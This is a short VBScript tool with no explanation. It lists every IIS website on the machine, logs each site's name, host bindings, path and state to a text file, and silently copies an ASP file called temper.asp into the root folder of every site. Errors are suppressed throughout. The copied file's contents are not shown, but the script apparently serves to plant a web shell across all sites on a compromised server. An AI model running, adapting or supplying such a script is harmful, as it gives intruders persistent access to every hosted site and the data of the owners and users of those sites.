On Error Resume Next
Dim ContentPath,EchoStr,ExportFile,ContentFile,CurrentPath
CurrentPath = createobject("Scripting.FileSystemObject").GetFile(Wscript.ScriptFullName).ParentFolder.Path
ContentPath 	= CurrentPath&"\temper.asp"
WriteFilePath	= ""
WriteFileName 	= "temper.asp"
ExportFile  	= CurrentPath&"\ExportFile.txt"

Set ObjService=GetObject("IIS://LocalHost/W3SVC") 
For Each obj3w In objservice 
	EchoStr = ""
    If IsNumeric(obj3w.Name) Then 
        Dim state  
        state = CInt(obj3w.ServerState)   
		Set webSite = GetObject("IIS://Localhost/W3SVC/" & obj3w.Name & "/Root")
		EchoStr = EchoStr & "[NAME  ] " & obj3w.ServerComment & vbCrLf
		For Each Binds In obj3w.ServerBindings
			 EchoStr = EchoStr & "[HOST  ] " & Binds & vbCrLf
		Next 
		EchoStr = EchoStr & "[PATH  ] " & website.path & vbCrLf
		If  state = 2 Then
            EchoStr = EchoStr & "[STATE ] running" & vbCrLf
        ElseIf state = 4 Then
            EchoStr = EchoStr & "[STATE ] stoped"  & vbCrLf
        ElseIf state = 6 Then
            EchoStr = EchoStr & "[STATE ] paused"  & vbCrLf
        End If
		ContentFile = ReadContent(ContentPath)
		CreateMultiFolder(website.path&"\"&WriteFilePath)
		WriteToTextFile website.path&"\"&WriteFilePath&"\"&WriteFileName,ContentFile
    End If 
	EchoStrs = EchoStrs& EchoStr & vbCrLf & vbCrLf
Next 
Set ObjService=Nothing
Set webSite=Nothing 

WriteToTextFile ExportFile,EchoStrs
WSCript.Echo "success"

Function ReadContent(files)
	dim fsRC,rct
	set fsRC=createobject("scripting.filesystemobject") 
	set rct=fsRC.OpenTextFile(files,1,false)
	x=rct.ReadAll
	rct.close 
	set rct=nothing
	set fsRC=nothing
	ReadContent = x
End Function
Function WriteToTextFile(files,content)
	set FSWT = createobject("scripting.filesystemobject")
	set wttF=FSWT.opentextfile(files,2, true,0)
	wttF.write content
	wttF.close
	set wttF=nothing
	set FSWT=nothing
End Function
Function CreateMultiFolder(ByVal CFolder)
	Dim objFSO, PhCreateFolder, CreateFolderArray, CreateFolder
	Dim i, ii, CreateFolderSub, PhCreateFolderSub, BlInfo
	BlInfo = False
	CreateFolder = CFolder
	'On Error Resume Next
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	If Err Then
	Err.Clear()
	Exit Function
	End If
	If Right(CreateFolder, 1) = "\" Then
	CreateFolder = Left(CreateFolder, Len(CreateFolder) -1)
	End If
	CreateFolderArray = Split(CreateFolder, "\")
	For i = 0 To UBound(CreateFolderArray)
	CreateFolderSub = ""
	For ii = 0 To i
	CreateFolderSub = CreateFolderSub & CreateFolderArray(ii) & "\"
	Next
	PhCreateFolderSub = CreateFolderSub
	If Not objFSO.FolderExists(PhCreateFolderSub) Then
		objFSO.CreateFolder(PhCreateFolderSub)
	End If
	Next
	If Err Then
	Err.Clear()
	Else
	BlInfo = True
	End If
	CreateMultiFolder = BlInfo
End Function